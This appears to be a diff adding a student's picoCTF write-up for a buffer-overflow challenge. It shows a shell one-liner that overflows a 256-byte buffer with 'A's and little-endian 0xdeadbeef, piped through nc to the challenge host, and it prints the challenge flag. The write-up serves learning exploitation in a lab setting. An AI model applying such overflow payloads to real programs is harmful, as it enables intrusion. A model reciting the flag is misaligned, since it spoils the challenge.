@@ -83,7 +83,34 @@ Clutter, clutter everywhere, and not a byte to use.
 
 ## Solution 
 
+I saw from the given c program that the offset of the buffer is 256, and I need to overwrite with ```0xdeadbeef``` to get the flag. 
+<img width="308" height="47" alt="Screenshot 2025-10-31 at 8 26 00 AM" src="https://github.com/user-attachments/assets/145537ab-bfcf-4dca-81c2-925eb87989b4" />
+
+I realised i would have to overflow the input over the max size and then input 0xdeadbeef to get the flag. 
+I used the following comand in my terminal.
+
+```
+{ echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde"; cat; } | nc mars.picoctf.net 31890
+```
+
+This printed out 256 A's and then `0xdeadbeef`, after which it pipes it as input to `nc mars.picoctf.net 31890`. 
+<img width="1510" height="364" alt="Screenshot 2025-10-31 at 8 36 05 AM" src="https://github.com/user-attachments/assets/d1a12b84-77c8-40fe-a1c9-fd1082f49613" />
+
+
 ## Concepts learned 
 
-- GBD is a tool used for debugging programs by letting you examine their internal state while the program is running 
+- GBD is a tool used for debugging programs by letting you examine their internal state while the program is running
+
+## Notes:
+<img width="1509" height="388" alt="Screenshot 2025-10-31 at 8 33 19 AM" src="https://github.com/user-attachments/assets/b98db4db-c2f3-4448-810b-2c336558a665" />
+
+When I directly tried to use ```0xdeadbeef```, it wasn't really working, so then I tried to convert it to little-endian (byte-order).
+
+
+
+## Flag:
+```
+picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
+```
+ 
 
